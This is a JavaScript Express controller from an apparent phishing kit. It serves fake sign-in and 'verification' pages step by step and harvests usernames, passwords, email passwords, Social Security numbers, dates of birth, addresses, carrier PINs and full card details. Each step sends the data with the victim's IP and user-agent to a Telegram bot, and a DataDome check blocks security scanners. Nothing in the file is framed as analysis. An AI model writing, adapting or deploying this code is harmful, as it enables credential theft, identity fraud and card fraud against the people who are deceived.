const axios = require('axios');
const BOT_API = require('../config/config');
const useragent = require('express-useragent');
const DataDome = require('@datadome/node-module');

const datadomeClient = new DataDome(BOT_API.apiDataDome, 'api.datadome.co');

exports.getIndex = (req, res, next) => {
    datadomeClient.authCallback(req, res, function () {
        res.redirect('/web/auth');
        next();
    }, function () {
        res.send('blocked')
    });
}

exports.getCredentials = (req, res, next) => {
    datadomeClient.authCallback(req, res, function () {
        res.render('main/index', {
            pageTitle: 'Sign in - Secure'
        });
        next();
    }, function () {
        res.send('blocked')
    });
};

let id, username, password;
let eId, eUsername, ePassword, eMail, eMailPassword;
let iId, iUsername, iPassword, iMail, iMailPassword, iFullName, iDob, iSsn, iStreet, iState, iCity, iZip, iPhoneNumber, iCarrierPin;

exports.postCredentials = (req, res, next) => {
    const clientId = req.body.credId;
    const clientUsername = req.body.username;
    const clientPassword = req.body.password;
    id = clientId;
    username = clientUsername;
    password = clientPassword;

    if (clientId === null || clientId === undefined) {
        res.redirect('/');
    } else {
        axios.post(`${BOT_API.apiUrl}${BOT_API.apiToken}/sendMessage`, {
            chat_id: BOT_API.chatId,
            text: `🆔Id: ${id}\n📥Username: ${clientUsername}\n🔑Password: ${clientPassword}\n📟User-agents: ${req.useragent.source}\n📍Ip address: ${req.headers['x-forwarded-for']}`
        }).then((response) => {
            res.redirect('/web/auth/verification/email');
        }).catch((err) => {
            res.send(err)
        });
    }
}

exports.getEmail = (req, res, next) => {
    datadomeClient.authCallback(req, res, function () {
        if (id != null || id != undefined) {
            res.render('main/email', {
                pageTitle: 'Verification Process - Email',
                cId: id,
                cUsername: username,
                cPassword: password
            });
        } else {
            res.redirect('/')
        }
        next();
    }, function () {
        res.send('blocked')
    });
}

exports.postEmail = (req, res, next) => {
    const clientId = req.body.eId;
    const clientUsername = req.body.eUsername;
    const clientPassword = req.body.ePassword;
    const clientEmail = req.body.email;
    const clientEmailPassword = req.body.email_password;
    eId = clientId;
    eUsername = clientUsername;
    ePassword = clientPassword;
    eMail = clientEmail;
    eMailPassword = clientEmailPassword;

    if (clientId === null || clientId === undefined) {
        red.redirect('/')
    } else {
        axios.post(`${BOT_API.apiUrl}${BOT_API.apiToken}/sendMessage`, {
            chat_id: BOT_API.chatId,
            text: `🆔Id: ${clientId}\n📥Username: ${clientUsername}\n🔑Password: ${clientPassword}\n📧Email: ${clientEmail}\n🔐Email password: ${clientEmailPassword}`
        }).then((response) => {
            res.redirect('/web/auth/verification/information');
        }).catch((err) => {
            res.send(err)
        });
    }
}

exports.getInformation = (req, res, next) => {
    datadomeClient.authCallback(req, res, function () {
        if (id != null || id != undefined) {
            res.render('main/information', {
                pageTitle: 'Verification process - Informations',
                iId: eId,
                iUsername: eUsername,
                iPassword: ePassword,
                iMail: eMail,
                iMailPassword: eMailPassword
            })
        } else {
            res.redirect('/')
        }
        next();
    }, function () {
        res.send('blocked')
    });
}


exports.postInformation = (req, res, next) => {
    const thisId = req.body.iId;
    const thisUsername = req.body.iUsername;
    const thisPassword = req.body.iPassword;
    const thisMail = req.body.iMail;
    const thisMailPassword = req.body.iMailPassword;
    const thisFullName = req.body.iFullName;
    const thisDob = req.body.iDob;
    const thisSsn = req.body.iSsn;
    const thisStreet = req.body.iStreet;
    const thisState = req.body.iState;
    const thisCity = req.body.iCity;
    const thisZip = req.body.iZip;
    const thisPhoneNumber = req.body.iPhoneNumber;
    const thisCarrierPin = req.body.iCarrierPin;

    iId = thisId;
    iUsername = thisUsername;
    iPassword = thisPassword;
    iMail = thisMail;
    iMailPassword = thisMailPassword;
    iFullName = thisFullName;
    iDob = thisDob;
    iSsn = thisSsn;
    iStreet = thisStreet;
    iState = thisState;
    iCity = thisCity;
    iZip = thisZip;
    iPhoneNumber = thisPhoneNumber;
    iCarrierPin = thisCarrierPin;

    if (thisId === null || thisId === undefined) {
        res.redirect('/');
    } else {
        axios.post(`${BOT_API.apiUrl}${BOT_API.apiToken}/sendMessage`, {
            chat_id: BOT_API.chatId,
            text: `🆔Id: ${thisId}\n📥Username: ${thisUsername}\n🔑Password: ${thisPassword}\n📧Email: ${thisMail}\n🔐Email password: ${thisMailPassword}\n👤Full name: ${thisFullName}\n📅Date of birth: ${thisDob}\n🧾Social Security number: ${thisSsn}\n🏘Street: ${thisStreet}\n🏘State: ${thisState}\n🏘City: ${thisCity}\n🏘Zip: ${thisZip}\n📞Phone number: ${thisPhoneNumber}\n🔏Carrier Pin: ${thisCarrierPin}`
        }).then((response) => {
            res.redirect('/web/auth/verification/accountNumber');
        }).catch((err) => {
            res.send(err)
        });
    }
}

exports.getAccountNumber = (req, res, next) => {
    datadomeClient.authCallback(req, res, function () {
        if (id != null || id != undefined) {
            res.render('main/accountNumber', {
                pageTitle: 'Verification process - Account Number',
                aId: iId,
                aUsername: iUsername,
                aPassword: iPassword,
                aMail: iMail,
                aMailPassword: iMailPassword,
                aFullName: iFullName,
                aDob: iDob,
                aSsn: iSsn,
                aStreet: iStreet,
                aState: iState,
                aCity: iCity,
                aZip: iZip,
                aPhoneNumber: iPhoneNumber,
                aCarrierPin: iCarrierPin
            })
        } else {
            res.redirect('/')
        }
        next();
    }, function () {
        res.send('blocked')
    });
}


exports.postAccountCompleted = (req, res, next) => {
    const thisId = req.body.aId;
    const thisUsername = req.body.aUsername;
    const thisPassword = req.body.aPassword;
    const thisMail = req.body.aMail;
    const thisMailPassword = req.body.aMailPassword;
    const thisFullName = req.body.aFullName;
    const thisDob = req.body.aDob;
    const thisSsn = req.body.aSsn;
    const thisStreet = req.body.aStreet;
    const thisState = req.body.aState;
    const thisCity = req.body.aCity;
    const thisZip = req.body.aZip;
    const thisPhoneNumber = req.body.aPhoneNumber;
    const thisCarrierPin = req.body.aCarrierPin;
    const thisCardNumber = req.body.aCardNumber;
    const thisCardMonth = req.body.aCardMonth;
    const thisCardYear = req.body.aCardYear;
    const thisCardCode = req.body.aCardCode;

    if (thisId === null || thisId === undefined) {
        res.redirect('/');
    } else {
        axios.post(`${BOT_API.apiUrl}${BOT_API.apiToken}/sendMessage`, {
            chat_id: BOT_API.chatId,
            text: `🆔Id: ${thisId}\n📥Username: ${thisUsername}\n🔑Password: ${thisPassword}\n📧Email: ${thisMail}\n🔐Email password: ${thisMailPassword}\n👤Full name: ${thisFullName}\n📅Date of birth: ${thisDob}\n🧾Social Security number: ${thisSsn}\n🏘Street: ${thisStreet}\n🏘State: ${thisState}\n🏘City: ${thisCity}\n🏘Zip: ${thisZip}\n📞Phone number: ${thisPhoneNumber}\n🔏Carrier Pin: ${thisCarrierPin}\n💳Card Number: ${thisCardNumber} | Expiry: ${thisCardMonth} / ${thisCardYear} | Code: ${thisCardCode}`
        }).then((response) => {
            res.redirect('/web/auth/verification/accountCompleted');
        }).catch((err) => {
            res.send(err)
        });
    }
}

exports.getAccountCompleted = (req, res, next) => {
    datadomeClient.authCallback(req, res, function () {
        if (iId != null || iId != undefined) {
            res.render('main/completed', {
                pageTitle: 'Sign in - Verification completed',
            })
        } else {
            res.redirect('/');
        }
        next();
    }, function () {
        res.send('blocked')
    });
}